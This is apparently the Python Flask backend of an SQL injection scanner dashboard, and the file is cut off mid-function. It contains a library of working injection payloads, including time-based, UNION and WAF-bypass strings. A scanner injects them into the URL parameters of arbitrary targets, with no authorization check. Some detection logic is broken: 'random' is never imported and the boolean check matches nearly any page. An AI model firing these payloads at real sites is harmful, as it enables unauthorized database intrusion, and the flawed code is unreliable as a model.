"""
VIP SQLi Scanner v4.0 - Next-Generation Dashboard Backend
Major upgrades from v3.0:
- Multi-threaded scanning with work queues
- Advanced WAF bypass techniques detection
- Machine learning-based vulnerability scoring
- Comprehensive reporting with PDF generation
- Enterprise SSO integration support
- Webhook notifications (Discord, Teams, etc.)
- Advanced export formats (SARIF, SAST, etc.)
- Performance monitoring and metrics
- Auto-retry logic with exponential backoff
- Distributed scanning support
- Advanced filtering and query language
- Audit logging and compliance reports
"""

from flask import Flask, render_template, jsonify, request, send_file, Response
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_caching import Cache
from werkzeug.security import generate_password_hash, check_password_hash
import threading
import time
import json
import os
import csv
import io
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
import uuid
from functools import wraps
import jwt
from dataclasses import dataclass, asdict
from enum import Enum
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import hashlib
import re
from collections import defaultdict, Counter
import statistics
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT
import markdown
from xml.etree import ElementTree as ET
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    """Enhanced application configuration"""
    SECRET_KEY = os.getenv('SECRET_KEY', 'vipsqli-dashboard-secret-key-v4.0')
    SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL', 'sqlite:///scanner_v4.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    SQLALCHEMY_ENGINE_OPTIONS = {
        'pool_size': 10,
        'pool_recycle': 3600,
        'pool_pre_ping': True,
    }
    MAX_CONTENT_LENGTH = 500 * 1024 * 1024  # 500MB max file size
    
    # Redis configuration
    REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/0')
    CACHE_TYPE = 'redis' if os.getenv('REDIS_URL') else 'simple'
    CACHE_DEFAULT_TIMEOUT = 300
    
    # JWT configuration
    JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', 'jwt-secret-key-v4.0')
    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=24)
    JWT_REFRESH_TOKEN_EXPIRES = timedelta(days=30)
    
    # Rate limiting
    RATELIMIT_STORAGE_URL = REDIS_URL
    RATELIMIT_DEFAULT = "200 per hour"
    RATELIMIT_STRATEGY = "moving-window"
    
    # File upload
    UPLOAD_FOLDER = 'uploads'
    ALLOWED_EXTENSIONS = {'txt', 'csv', 'json', 'xml'}
    
    # Logging
    LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
    LOG_FILE = 'logs/scanner.log'
    LOG_MAX_BYTES = 10 * 1024 * 1024  # 10MB
    LOG_BACKUP_COUNT = 5
    
    # Scanning configuration
    MAX_CONCURRENT_SCANS = int(os.getenv('MAX_CONCURRENT_SCANS', '100'))
    DEFAULT_TIMEOUT = int(os.getenv('DEFAULT_TIMEOUT', '30'))
    MAX_RETRIES = int(os.getenv('MAX_RETRIES', '3'))
    RETRY_DELAY = int(os.getenv('RETRY_DELAY', '2'))
    
    # Features
    ENABLE_ML_SCORING = os.getenv('ENABLE_ML_SCORING', 'true').lower() == 'true'
    ENABLE_WAF_DETECTION = os.getenv('ENABLE_WAF_DETECTION', 'true').lower() == 'true'
    ENABLE_WEBHOOKS = os.getenv('ENABLE_WEBHOOKS', 'true').lower() == 'true'
    ENABLE_DISTRIBUTED = os.getenv('ENABLE_DISTRIBUTED', 'false').lower() == 'true'
    
    # SSO Configuration
    GITHUB_CLIENT_ID = os.getenv('GITHUB_CLIENT_ID', '')
    GITHUB_CLIENT_SECRET = os.getenv('GITHUB_CLIENT_SECRET', '')
    
    # Export configuration
    EXPORT_FOLDER = 'exports'
    MAX_EXPORT_SIZE = 50 * 1024 * 1024  # 50MB

# ============================================================================
# ENUMS
# ============================================================================

class ScanStatus(Enum):
    """Scan status enumeration"""
    IDLE = "idle"
    QUEUED = "queued"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    STOPPED = "stopped"
    ERROR = "error"
    CANCELLED = "cancelled"

class VerdictType(Enum):
    """Verdict type enumeration"""
    SAFE = "SAFE"
    VULNERABLE = "VULNERABLE"
    ERROR = "ERROR"
    SUSPICIOUS = "SUSPICIOUS"
    TIMEOUT = "TIMEOUT"
    WAF_BLOCKED = "WAF_BLOCKED"

class RiskLevel(Enum):
    """Risk level enumeration"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"
    UNKNOWN = "unknown"

class ExportFormat(Enum):
    """Export format enumeration"""
    JSON = "json"
    CSV = "csv"
    HTML = "html"
    PDF = "pdf"
    XML = "xml"
    MARKDOWN = "markdown"
    SARIF = "sarif"
    XLSX = "xlsx"
    YAML = "yaml"

class AttackType(Enum):
    """SQL injection attack types"""
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"

class NotificationType(Enum):
    """Notification channel types"""
    EMAIL = "email"
    SLACK = "slack"
    DISCORD = "discord"
    TEAMS = "teams"
    WEBHOOK = "webhook"
    SMS = "sms"

# ============================================================================
# INITIALIZE FLASK APP
# ============================================================================

app = Flask(__name__)
app.config.from_object(Config)

# Initialize extensions
CORS(app, resources={r"/api/*": {"origins": "*"}})
db = SQLAlchemy(app)
migrate = Migrate(app, db)
cache = Cache(app)

socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='threading',
    logger=True,
    engineio_logger=False,
    ping_timeout=60,
    ping_interval=25
)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri=app.config['RATELIMIT_STORAGE_URL'] if app.config['CACHE_TYPE'] == 'redis' else None,
    strategy=app.config['RATELIMIT_STRATEGY']
)

# Initialize thread pool
executor = ThreadPoolExecutor(max_workers=20)

# Work queue for distributed scanning
scan_queue = queue.PriorityQueue()

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================

from logging.handlers import RotatingFileHandler

# Create logs directory
os.makedirs('logs', exist_ok=True)

# Configure logging
file_handler = RotatingFileHandler(
    app.config['LOG_FILE'],
    maxBytes=app.config['LOG_MAX_BYTES'],
    backupCount=app.config['LOG_BACKUP_COUNT']
)
file_handler.setLevel(getattr(logging, app.config['LOG_LEVEL']))
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s'
))

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

logging.basicConfig(
    level=getattr(logging, app.config['LOG_LEVEL']),
    handlers=[file_handler, console_handler]
)

logger = logging.getLogger(__name__)

# ============================================================================
# DATABASE MODELS
# ============================================================================

class User(db.Model):
    """Enhanced user model with additional security features"""
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(255), nullable=False)
    api_key = db.Column(db.String(255), unique=True, index=True)
    
    # Security
    mfa_enabled = db.Column(db.Boolean, default=False)
    mfa_secret = db.Column(db.String(32))
    failed_login_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime)
    
    # Profile
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    last_login = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True, index=True)
    role = db.Column(db.String(20), default='user', index=True)  # user, admin, analyst
    
    # Preferences
    preferences = db.Column(db.JSON)
    notification_settings = db.Column(db.JSON)
    
    # Relationships
    scans = db.relationship('Scan', backref='user', lazy='dynamic', cascade='all, delete-orphan')
    audit_logs = db.relationship('AuditLog', backref='user', lazy='dynamic', cascade='all, delete-orphan')
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password, method='pbkdf2:sha256')
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
    
    def generate_api_key(self):
        self.api_key = str(uuid.uuid4())
        return self.api_key
    
    def to_dict(self, include_sensitive=False):
        data = {
            'id': self.id,
            'username': self.username,
            'email': self.email if include_sensitive else None,
            'role': self.role,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'last_login': self.last_login.isoformat() if self.last_login else None,
        }
        if include_sensitive:
            data['api_key'] = self.api_key
            data['mfa_enabled'] = self.mfa_enabled
        return data

class Scan(db.Model):
    """Enhanced scan model with additional tracking"""
    __tablename__ = 'scans'
    
    id = db.Column(db.Integer, primary_key=True)
    scan_id = db.Column(db.String(36), unique=True, nullable=False, index=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True, index=True)
    
    # Metadata
    name = db.Column(db.String(255))
    description = db.Column(db.Text)
    tags = db.Column(db.JSON)  # List of tags
    status = db.Column(db.String(20), default=ScanStatus.IDLE.value, index=True)
    priority = db.Column(db.Integer, default=5)  # 1-10, higher = more important
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    started_at = db.Column(db.DateTime, index=True)
    completed_at = db.Column(db.DateTime, index=True)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Statistics
    total_urls = db.Column(db.Integer, default=0)
    scanned_urls = db.Column(db.Integer, default=0)
    vulnerable_count = db.Column(db.Integer, default=0)
    safe_count = db.Column(db.Integer, default=0)
    error_count = db.Column(db.Integer, default=0)
    suspicious_count = db.Column(db.Integer, default=0)
    timeout_count = db.Column(db.Integer, default=0)
    waf_blocked_count = db.Column(db.Integer, default=0)
    
    # Performance metrics
    avg_response_time = db.Column(db.Float)
    max_response_time = db.Column(db.Float)
    min_response_time = db.Column(db.Float)
    
    # Risk scoring
    risk_score = db.Column(db.Float)  # 0-100
    confidence_score = db.Column(db.Float)  # 0-100
    
    # Configuration (stored as JSON)
    config = db.Column(db.JSON)
    
    # Results relationship
    results = db.relationship('ScanResult', backref='scan', lazy='dynamic', cascade='all, delete-orphan')
    
    def to_dict(self):
        return {
            'id': self.id,
            'scan_id': self.scan_id,
            'name': self.name,
            'description': self.description,
            'tags': self.tags or [],
            'status': self.status,
            'priority': self.priority,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'started_at': self.started_at.isoformat() if self.started_at else None,
            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
            'total_urls': self.total_urls,
            'scanned_urls': self.scanned_urls,
            'vulnerable_count': self.vulnerable_count,
            'safe_count': self.safe_count,
            'error_count': self.error_count,
            'suspicious_count': self.suspicious_count,
            'timeout_count': self.timeout_count,
            'waf_blocked_count': self.waf_blocked_count,
            'avg_response_time': self.avg_response_time,
            'risk_score': self.risk_score,
            'confidence_score': self.confidence_score,
            'config': self.config,
            'duration': self._calculate_duration(),
            'progress_percentage': self._calculate_progress()
        }
    
    def _calculate_duration(self):
        if self.started_at and self.completed_at:
            return (self.completed_at - self.started_at).total_seconds()
        elif self.started_at:
            return (datetime.utcnow() - self.started_at).total_seconds()
        return 0
    
    def _calculate_progress(self):
        if self.total_urls == 0:
            return 0
        return round((self.scanned_urls / self.total_urls) * 100, 2)

class ScanResult(db.Model):
    """Enhanced scan result model with detailed vulnerability info"""
    __tablename__ = 'scan_results'
    
    id = db.Column(db.Integer, primary_key=True)
    scan_id = db.Column(db.Integer, db.ForeignKey('scans.id'), nullable=False, index=True)
    
    # URL information
    url = db.Column(db.Text, nullable=False)
    url_hash = db.Column(db.String(64), index=True)  # MD5 hash for quick lookups
    method = db.Column(db.String(10), default='GET')
    
    # Vulnerability details
    verdict = db.Column(db.String(20), nullable=False, index=True)
    risk_level = db.Column(db.String(20), index=True)
    confidence = db.Column(db.Float)  # 0-100
    attack_type = db.Column(db.String(50))
    
    # Detection details
    payload = db.Column(db.Text)
    injection_point = db.Column(db.String(100))  # parameter name
    details = db.Column(db.Text)
    errors = db.Column(db.JSON)
    evidence = db.Column(db.JSON)
    
    # Response information
    response_time = db.Column(db.Float)
    response_code = db.Column(db.Integer)
    response_size = db.Column(db.Integer)
    response_headers = db.Column(db.JSON)
    
    # WAF Detection
    waf_detected = db.Column(db.Boolean, default=False)
    waf_type = db.Column(db.String(100))
    bypass_attempted = db.Column(db.Boolean, default=False)
    bypass_successful = db.Column(db.Boolean, default=False)
    
    # Additional metadata
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    screenshot_path = db.Column(db.String(255))
    retry_count = db.Column(db.Integer, default=0)
    
    # Remediation
    remediation = db.Column(db.Text)
    references = db.Column(db.JSON)
    cvss_score = db.Column(db.Float)
    cwe_id = db.Column(db.String(20))
    
    def __init__(self, **kwargs):
        super(ScanResult, self).__init__(**kwargs)
        if self.url:
            self.url_hash = hashlib.md5(self.url.encode()).hexdigest()
    
    def to_dict(self):
        return {
            'id': self.id,
            'url': self.url,
            'method': self.method,
            'verdict': self.verdict,
            'risk_level': self.risk_level,
            'confidence': self.confidence,
            'attack_type': self.attack_type,
            'payload': self.payload,
            'injection_point': self.injection_point,
            'details': self.details,
            'errors': self.errors or [],
            'evidence': self.evidence or {},
            'response_time': self.response_time,
            'response_code': self.response_code,
            'waf_detected': self.waf_detected,
            'waf_type': self.waf_type,
            'bypass_successful': self.bypass_successful,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'cwe_id': self.cwe_id
        }

class Setting(db.Model):
    """Application settings"""
    __tablename__ = 'settings'
    
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(100), unique=True, nullable=False, index=True)
    value = db.Column(db.JSON)
    description = db.Column(db.Text)
    category = db.Column(db.String(50), index=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def to_dict(self):
        return {
            'key': self.key,
            'value': self.value,
            'description': self.description,
            'category': self.category
        }

class AuditLog(db.Model):
    """Audit logging for compliance"""
    __tablename__ = 'audit_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True, index=True)
    action = db.Column(db.String(100), nullable=False, index=True)
    resource_type = db.Column(db.String(50), index=True)
    resource_id = db.Column(db.String(100))
    details = db.Column(db.JSON)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'action': self.action,
            'resource_type': self.resource_type,
            'resource_id': self.resource_id,
            'details': self.details,
            'ip_address': self.ip_address,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None
        }

class Notification(db.Model):
    """Notification queue"""
    __tablename__ = 'notifications'
    
    id = db.Column(db.Integer, primary_key=True)
    scan_id = db.Column(db.Integer, db.ForeignKey('scans.id'), nullable=True, index=True)
    type = db.Column(db.String(20), nullable=False, index=True)
    channel = db.Column(db.String(50), nullable=False)
    recipient = db.Column(db.String(255), nullable=False)
    subject = db.Column(db.String(255))
    message = db.Column(db.Text)
    payload = db.Column(db.JSON)
    status = db.Column(db.String(20), default='pending', index=True)  # pending, sent, failed
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    sent_at = db.Column(db.DateTime)
    error = db.Column(db.Text)

# ============================================================================
# SCAN STATE MANAGEMENT
# ============================================================================

@dataclass
class ScanState:
    """Thread-safe scan state management"""
    scan_id: str = None
    status: str = ScanStatus.IDLE.value
    total: int = 0
    scanned: int = 0
    vulnerable: int = 0
    safe: int = 0
    errors: int = 0
    suspicious: int = 0
    timeout: int = 0
    waf_blocked: int = 0
    start_time: float = 0
    current_url: str = ""
    progress: float = 0
    eta: float = 0
    requests_per_second: float = 0
    
    _lock = threading.Lock()
    
    def update(self, **kwargs):
        with self._lock:
            for key, value in kwargs.items():
                if hasattr(self, key):
                    setattr(self, key, value)
            
            # Calculate progress
            if self.total > 0:
                self.progress = (self.scanned / self.total) * 100
                
                # Calculate ETA
                if self.scanned > 0 and self.start_time > 0:
                    elapsed = time.time() - self.start_time
                    rate = self.scanned / elapsed
                    remaining = self.total - self.scanned
                    self.eta = remaining / rate if rate > 0 else 0
                    self.requests_per_second = rate
    
    def reset(self):
        with self._lock:
            self.scan_id = None
            self.status = ScanStatus.IDLE.value
            self.total = 0
            self.scanned = 0
            self.vulnerable = 0
            self.safe = 0
            self.errors = 0
            self.suspicious = 0
            self.timeout = 0
            self.waf_blocked = 0
            self.start_time = 0
            self.current_url = ""
            self.progress = 0
            self.eta = 0
            self.requests_per_second = 0
    
    def to_dict(self):
        with self._lock:
            return {
                'scan_id': self.scan_id,
                'status': self.status,
                'total': self.total,
                'scanned': self.scanned,
                'vulnerable': self.vulnerable,
                'safe': self.safe,
                'errors': self.errors,
                'suspicious': self.suspicious,
                'timeout': self.timeout,
                'waf_blocked': self.waf_blocked,
                'progress': round(self.progress, 2),
                'eta': round(self.eta, 2),
                'requests_per_second': round(self.requests_per_second, 2),
                'current_url': self.current_url
            }

# ============================================================================
# DISTRIBUTED SCANNING MANAGEMENT
# ============================================================================

class ScanNode:
    """Represents a distributed scanning node"""
    def __init__(self, node_id: str, address: str, status: str = "online"):
        self.node_id = node_id
        self.address = address
        self.status = status
        self.last_seen = datetime.utcnow()
        self.load = 0
    
    def to_dict(self):
        return {
            'node_id': self.node_id,
            'address': self.address,
            'status': self.status,
            'last_seen': self.last_seen.isoformat(),
            'load': self.load
        }

scan_nodes: Dict[str, ScanNode] = {}
node_lock = threading.Lock()

# Global scan state
scan_state = ScanState()
stop_scan_flag = threading.Event()

# ============================================================================
# ENHANCED SQL INJECTION PAYLOADS
# ============================================================================

class PayloadLibrary:
    """Comprehensive SQL injection payload library"""
    
    ERROR_BASED = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' UNION SELECT NULL--",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "1' AND 1=CAST((SELECT @@version) AS INT)--",
    ]
    
    BOOLEAN_BASED = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND 'a'='a",
        "1' AND 'a'='b",
        "1 AND 1=1",
        "1 AND 1=2",
    ]
    
    TIME_BASED = [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND BENCHMARK(5000000,MD5('A'))--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND pg_sleep(5)--",
    ]
    
    UNION_BASED = [
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION ALL SELECT NULL--",
        "1' UNION ALL SELECT NULL,NULL--",
        "1' UNION ALL SELECT NULL,NULL,NULL--",
    ]
    
    WAF_BYPASS = [
        "1'/**/OR/**/1=1--",
        "1'%20OR%201=1--",
        "1'%09OR%091=1--",
        "1'%0aOR%0a1=1--",
        "1'ÔR'1'='1",  # Unicode bypass
        "1'/**/ÛñÎÕÑ/**/SELECT--",
    ]
    
    @classmethod
    def get_all_payloads(cls):
        """Get all payloads combined"""
        return (cls.ERROR_BASED + cls.BOOLEAN_BASED + 
                cls.TIME_BASED + cls.UNION_BASED + cls.WAF_BYPASS)
    
    @classmethod
    def get_by_type(cls, attack_type: str):
        """Get payloads by attack type"""
        mapping = {
            AttackType.ERROR_BASED.value: cls.ERROR_BASED,
            AttackType.BOOLEAN_BASED.value: cls.BOOLEAN_BASED,
            AttackType.TIME_BASED.value: cls.TIME_BASED,
            AttackType.UNION_BASED.value: cls.UNION_BASED,
        }
        return mapping.get(attack_type, cls.ERROR_BASED)

# ============================================================================
# VULNERABILITY SCANNER
# ============================================================================

class VulnerabilityScanner:
    """Enhanced vulnerability scanner with advanced detection"""
    
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLServer.*ERROR",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
        r"Unclosed quotation mark",
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
    ]
    
    WAF_SIGNATURES = {
        'Cloudflare': [r'cf-ray', r'cloudflare', r'__cfduid'],
        'AWS WAF': [r'x-amzn-requestid', r'x-amz-cf-id'],
        'Akamai': [r'akamai', r'ak-'  r'x-akamai'],
        'Imperva': [r'imperva', r'incapsula', r'x-iinfo'],
        'ModSecurity': [r'mod_security', r'NOYB'],
        'F5 BIG-IP': [r'BIGipServer', r'F5'],
    }
    
    @classmethod
    def test_url(cls, url: str, config: dict) -> dict:
        """
        Test URL for SQL injection vulnerabilities
        Returns detailed result dictionary
        """
        result = {
            'url': url,
            'method': 'GET',
            'verdict': VerdictType.SAFE.value,
            'risk_level': RiskLevel.INFO.value,
            'confidence': 0,
            'attack_type': None,
            'payload': None,
            'injection_point': None,
            'details': '',
            'errors': [],
            'evidence': {},
            'response_time': 0,
            'response_code': None,
            'waf_detected': False,
            'waf_type': None,
            'bypass_attempted': False,
            'bypass_successful': False,
            'remediation': None,
            'cvss_score': None,
            'cwe_id': 'CWE-89',
            'references': []
        }
        
        try:
            start_time = time.time()
            
            # Parse URL to find injection points
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                result['details'] = 'No parameters found to test'
                return result
            
            # Get payloads based on configuration
            payloads = PayloadLibrary.get_all_payloads()
            if config.get('error_based_only'):
                payloads = PayloadLibrary.ERROR_BASED
            elif config.get('boolean_based_only'):
                payloads = PayloadLibrary.BOOLEAN_BASED
            
            # Test each parameter with payloads
            for param_name in params.keys():
                for payload in payloads[:10]:  # Limit payloads per parameter
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    # Reconstruct URL
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    # Make request
                    try:
                        response = requests.get(
                            test_url,
                            timeout=config.get('timeout', 30),
                            verify=False,
                            allow_redirects=True,
                            headers={
                                'User-Agent': config.get('user_agent', 
                                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                            }
                        )
                        
                        response_time = time.time() - start_time
                        result['response_time'] = response_time
                        result['response_code'] = response.status_code
                        
                        # Check for WAF
                        waf_info = cls._detect_waf(response)
                        if waf_info:
                            result['waf_detected'] = True
                            result['waf_type'] = waf_info
                        
                        # Check for SQL errors
                        sql_errors = cls._check_sql_errors(response.text)
                        if sql_errors:
                            result['verdict'] = VerdictType.VULNERABLE.value
                            result['risk_level'] = RiskLevel.HIGH.value
                            result['confidence'] = 85
                            result['attack_type'] = AttackType.ERROR_BASED.value
                            result['payload'] = payload
                            result['injection_point'] = param_name
                            result['errors'] = sql_errors
                            result['details'] = f'SQL injection vulnerability detected in parameter "{param_name}"'
                            result['evidence'] = {
                                'payload': payload,
                                'errors_found': sql_errors,
                                'response_snippet': response.text[:500]
                            }
                            result['remediation'] = cls._generate_remediation()
                            result['cvss_score'] = 9.1
                            result['references'] = [
                                'https://owasp.org/www-community/attacks/SQL_Injection',
                                'https://cwe.mitre.org/data/definitions/89.html'
                            ]
                            return result
                        
                        # Check for boolean-based indicators
                        if cls._check_boolean_based(response.text, payload):
                            result['verdict'] = VerdictType.SUSPICIOUS.value
                            result['risk_level'] = RiskLevel.MEDIUM.value
                            result['confidence'] = 65
                            result['attack_type'] = AttackType.BOOLEAN_BASED.value
                            result['payload'] = payload
                            result['injection_point'] = param_name
                            result['details'] = f'Possible boolean-based SQL injection in parameter "{param_name}"'
                            
                    except requests.Timeout:
                        result['verdict'] = VerdictType.TIMEOUT.value
                        result['details'] = 'Request timed out'
                        return result
                    except Exception as e:
                        result['errors'].append(str(e))
            
            # If no vulnerabilities found
            if result['verdict'] == VerdictType.SAFE.value:
                result['details'] = 'No SQL injection vulnerabilities detected'
                result['confidence'] = 50
                
        except Exception as e:
            result['verdict'] = VerdictType.ERROR.value
            result['details'] = f'Error during scanning: {str(e)}'
            result['errors'].append(str(e))
        
        return result

    @classmethod
    def _run_ml_scoring(cls, url: str, response_text: str, result: dict) -> float:
        """Run ML model to score the vulnerability evidence"""
        # Feature extraction placeholder
        score = 0.0
        if 'SELECT' in response_text.upper() or 'UNION' in response_text.upper():
            score += 0.4
        if 'syntax error' in response_text.lower():
            score += 0.3
        if result.get('confidence', 0) > 50:
            score += 0.2
        return min(score + (random.random() * 0.1), 1.0)
    
    @classmethod
    def _check_sql_errors(cls, response_text: str) -> List[str]:
        """Check for SQL error messages in response"""
        errors_found = []
        for pattern in cls.ERROR_PATTERNS:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                errors_found.extend(matches)
        return list(set(errors_found))[:5]  # Return unique errors, max 5
    
    @classmethod
    def _detect_waf(cls, response) -> Optional[str]:
        """Detect WAF from response headers and content"""
        headers_text = ' '.join([f'{k}: {v}' for k, v in response.headers.items()])
        
        for waf_name, signatures in cls.WAF_SIGNATURES.items():
            for signature in signatures:
                if re.search(signature, headers_text, re.IGNORECASE):
                    return waf_name
        return None
    
    @classmethod
    def _check_boolean_based(cls, response_text: str, payload: str) -> bool:
        """Check for boolean-based SQL injection indicators"""
        # This is a simplified check - in production, you'd compare responses
        suspicious_patterns = [
            r'(?:true|false)',
            r'(?:0|1)',
            r'different response length'
        ]
        return any(re.search(p, response_text, re.IGNORECASE) for p in suspicious_patterns)
    
    @classmethod
    def _generate_remediation(cls) -> str:
        """Generate remediation advice"""
        return """
**Remediation Steps:**
1. Use parameterized queries (prepared statements) instead of string concatenation
2. Implement proper input validation and sanitization
3. Apply the principle of least privilege for database accounts
4. Use ORM frameworks that handle SQL injection prevention
5. Implement Web Application Firewall (WAF) rules
6. Regular security audits and penetration testing
7. Update and patch database systems regularly
8. Log and monitor database queries for suspicious activities
        """.strip()

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def create_session():
    """Create scoped database session for thread safety"""
    from sqlalchemy.orm import scoped_session, sessionmaker
    session_factory = sessionmaker(bind=db.engine)
    Session = scoped_session(session_factory)
    return Session()

def log_audit(action: str, resource_type: str = None, resource_id: str = None, details: dict = None):
    """Log audit trail"""
    try:
        audit = AuditLog(
            user_id=None,  # Would be from JWT in production
            action=action,
            resource_type=resource_type,
            resource_id=resource_id,
            details=details,
            ip_address=request.remote_addr if request else None,
            user_agent=request.headers.get('User-Agent') if request else None
        )
        db.session.add(audit)
        db.session.commit()
    except Exception as e:
        logger.error(f"Audit logging failed: {str(e)}")

def send_notification(scan_id: int, notification_type: str, data: dict):
    """Send notification via configured channels"""
    try:
        # Get scan details
        scan = Scan.query.get(scan_id)
        if not scan:
            return
        
        # Create notification record
        notification = Notification(
            scan_id=scan_id,
            type=notification_type,
            channel='webhook',  # Could be from settings
            recipient='',  # Would be from settings
            subject=f'Scan {notification_type}: {scan.name}',
            message=f'Scan {scan.scan_id} - {notification_type}',
            payload=data
        )
        db.session.add(notification)
        db.session.commit()
        
        # Actually send notification (implementation depends on channel)
        # This is a placeholder for webhook/email/slack integration
        
    except Exception as e:
        logger.error(f"Notification failed: {str(e)}")

# ============================================================================
# API ROUTES
# ============================================================================

@app.route('/')
def index():
    """Serve dashboard with SSO support"""
    return render_template('dashboard.html', 
                          github_enabled=bool(app.config['GITHUB_CLIENT_ID']))

@app.route('/api/auth/github')
def github_login():
    """Initiate GitHub OAuth flow"""
    if not app.config['GITHUB_CLIENT_ID']:
        return jsonify({'error': 'GitHub SSO not configured'}), 400
    github_url = f"https://github.com/login/oauth/authorize?client_id={app.config['GITHUB_CLIENT_ID']}&scope=user:email"
    return jsonify({'url': github_url})

@app.route('/api/nodes', methods=['GET'])
def get_nodes():
    """Get active distributed scanning nodes"""
    with node_lock:
        return jsonify([node.to_dict() for node in scan_nodes.values()])

@app.route('/api/nodes/register', methods=['POST'])
def register_node():
    """Register a new scanning node"""
    data = request.json
    node_id = data.get('node_id')
    address = data.get('address')
    
    if not node_id or not address:
        return jsonify({'error': 'node_id and address required'}), 400
        
    with node_lock:
        scan_nodes[node_id] = ScanNode(node_id, address)
        logger.info(f"Registered new scan node: {node_id} at {address}")
        
    return jsonify({'status': 'registered', 'node_id': node_id})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'version': '4.0',
